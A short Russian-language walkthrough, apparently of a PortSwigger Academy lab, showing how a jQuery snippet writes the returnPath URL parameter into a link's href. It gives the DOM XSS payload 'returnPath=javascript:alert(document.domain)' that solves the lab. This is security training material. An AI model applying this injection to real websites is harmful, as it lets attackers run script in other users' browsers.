зайдем в случайный пост, и посмотрим на форму фидбека, отправим тестовый пост и посмотрим в прокси хттп хистори ответы
```
GET /feedback?returnPath=/post 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/6.%20DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20location.search%20source/pics%20for%20walktrough/1.png)
и заметим внутри следующий скрипт
```
                       <script>
                            $(function() {
                                $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
                            });
                        </script>
```
и отправим его в `Repeater`
И отправим 
```
GET /feedback?returnPath=javascript:alert(document.domain)
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/6.%20DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20location.search%20source/pics%20for%20walktrough/2.png) 
и получим сообщение об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/6.%20DOM%20XSS%20in%20jQuery%20anchor%20href%20attribute%20sink%20using%20location.search%20source/pics%20for%20walktrough/3.png) 
